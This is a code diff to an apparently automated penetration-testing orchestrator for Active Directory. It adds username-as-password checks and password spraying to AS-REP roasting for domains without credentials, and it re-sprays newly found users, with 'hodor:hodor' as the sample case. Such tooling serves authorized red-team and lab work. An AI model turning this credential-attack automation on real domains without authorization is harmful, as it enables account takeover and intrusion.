@@ -1099,11 +1099,14 @@ async def _auto_credential_access(  # noqa: PLR0912
 
     1) If no creds/hashes yet, run no-creds AS-REP roast per domain.
     2) For each new credential/hash, run kerberoast + secretsdump attempts.
+    3) When new users are discovered without credentials, run username_as_password.
     """
     processed_creds: set[tuple[str, str, str]] = set()
     processed_hashes: set[tuple[str, str, str]] = set()
     processed_crack_hashes: set[tuple[str, str, str, str]] = set()
     processed_no_cred_domains: set[str] = set()
+    processed_spray_domains: set[str] = set()  # Domains we've run username_as_password on
+    last_user_count: dict[str, int] = {}  # Track user counts per domain to detect new users
 
     while True:
         try:
@@ -1185,18 +1188,80 @@ async def _auto_credential_access(  # noqa: PLR0912
                     if domain in processed_no_cred_domains:
                         continue
                     domain_hosts = hosts_by_domain.get(domain.lower(), []) or host_ips
+                    # Include low-hanging fruit techniques that work without credentials
                     task_id = await dispatcher.request_credential_access(
                         source_agent="orchestrator",
                         domain=domain,
                         target_ips=domain_hosts,
-                        reason="no_creds_domain",
-                        techniques=["asrep_roast"],
+                        reason="low_hanging_fruit_no_creds",
+                        techniques=[
+                            "username_as_password",  # Test user:user combos (e.g., hodor:hodor)
+                            "password_spray",  # Common passwords
+                            "asrep_roast",  # Users without pre-auth
+                        ],
                     )
                     if task_id:
                         processed_no_cred_domains.add(domain)
                         logger.info(
-                            "Auto credential access (no-creds) dispatched for domain %s",
+                            "Auto credential access (low-hanging fruit, no-creds) dispatched for domain %s",
                             domain,
+                        )
+
+            # Check for new users without credentials - run username_as_password on them
+            # This catches cases like hodor:hodor where username equals password
+            for domain in sorted(domains):
+                if domain in processed_spray_domains:
+                    # Only re-run if we've discovered significantly more users
+                    current_count = sum(
+                        1 for u in state.all_users if (u.domain or "").lower() == domain.lower()
+                    )
+                    prev_count = last_user_count.get(domain.lower(), 0)
+                    if current_count <= prev_count + 5:  # Need at least 5 new users to re-spray
+                        continue
+
+                # Find users in this domain that don't have credentials
+                domain_users = [
+                    u.username
+                    for u in state.all_users
+                    if (u.domain or "").lower() == domain.lower()
+                ]
+                users_with_creds = {
+                    c.username.lower()
+                    for c in state.all_credentials
+                    if (c.domain or "").lower() == domain.lower()
+                }
+                users_without_creds = [u for u in domain_users if u.lower() not in users_with_creds]
+
+                if len(users_without_creds) >= 3:  # Only spray if we have enough users
+                    domain_hosts = hosts_by_domain.get(domain.lower(), []) or host_ips
+
+                    # Find an existing credential for this domain to use for user enumeration
+                    # username_as_password needs creds to enumerate users before spraying
+                    enum_cred = None
+                    for c in state.all_credentials:
+                        if (c.domain or "").lower() == domain.lower() and c.password:
+                            enum_cred = c
+                            break
+
+                    task_id = await dispatcher.request_credential_access(
+                        source_agent="orchestrator",
+                        domain=domain,
+                        target_ips=domain_hosts,
+                        username=enum_cred.username if enum_cred else "",
+                        password=enum_cred.password if enum_cred else None,
+                        reason="low_hanging_fruit_new_users",
+                        techniques=["username_as_password"],
+                    )
+                    if task_id:
+                        processed_spray_domains.add(domain)
+                        last_user_count[domain.lower()] = len(domain_users)
+                        logger.info(
+                            "Auto username_as_password dispatched for %d users without creds in %s (using %s for enum)",
+                            len(users_without_creds),
+                            domain,
+                            f"{enum_cred.domain}\\{enum_cred.username}"
+                            if enum_cred
+                            else "null session",
                         )
 
             for cred in state.all_credentials:
